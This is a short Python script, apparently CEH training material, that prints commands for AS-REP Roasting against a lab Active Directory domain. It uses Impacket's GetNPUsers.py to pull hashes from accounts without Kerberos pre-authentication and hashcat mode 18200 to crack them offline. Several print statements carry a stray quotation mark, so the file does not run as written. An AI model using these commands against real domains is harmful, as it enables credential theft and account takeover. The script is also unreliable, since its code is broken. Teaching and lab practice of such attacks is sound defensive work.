#!/usr/bin/env python3
# LAB-ONLY: AS-REP Roasting Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates commands for AS-REP Roasting!
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_DOMAIN = "lab-domain.local"
LAB_DOMAIN_CONTROLLER = "192.168.100.10"
LAB_USERLIST = "userlist.txt"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: AS-REP Roasting Helper")
    print("="*80")
    print("-"*80")
    print("[*] Commands to run:")
    print("-"*80")
    print("# 1. Find users with pre-authentication disabled:")
    print(f"   GetNPUsers.py {LAB_DOMAIN}/ -usersfile {LAB_USERLIST} -dc-ip {LAB_DOMAIN_CONTROLLER} -no-pass -request")
    print("# 2. Crack with hashcat:")
    print("   hashcat -m 18200 asrep.hash wordlist.txt")
    print("-"*80")

if __name__ == "__main__":
    main()
